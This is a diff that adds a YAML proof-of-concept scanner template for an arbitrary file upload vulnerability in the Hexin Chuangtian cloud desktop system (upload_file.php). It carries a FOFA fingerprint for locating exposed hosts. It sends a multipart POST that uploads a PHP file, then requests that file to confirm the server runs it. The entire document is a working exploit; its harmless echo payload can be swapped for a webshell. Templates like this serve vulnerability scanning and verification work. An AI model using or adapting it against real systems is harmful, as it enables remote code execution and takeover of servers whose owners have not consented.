@@ -1,0 +1,33 @@
+id: poc-yaml-hxct-cloud-desktop-system-upload-file-php-upload-anyfile
+info:
+  name: 和信创天云桌面系统 upload_file.php 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 和信创天云桌面系统
+  fofa: 和信下一代云桌面VENGD
+variables:
+  t1: random_int(1,100)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /Upload/upload_file.php?l=1
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv
+  data: '------WebKitFormBoundaryfcKRltGv
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.php"
+
+    Content-Type: image/avif
+
+
+    <?php echo {{.t2}};?>
+
+    ------WebKitFormBoundaryfcKRltGv--
+
+    '
+  expression: status_code == 200 && contains(body,"_Requst:<br>")
+- method: GET
+  path: /Upload/1/{{.t1}}.php
+  expression: status_code == 200 && contains(body,t2)
+transport: http
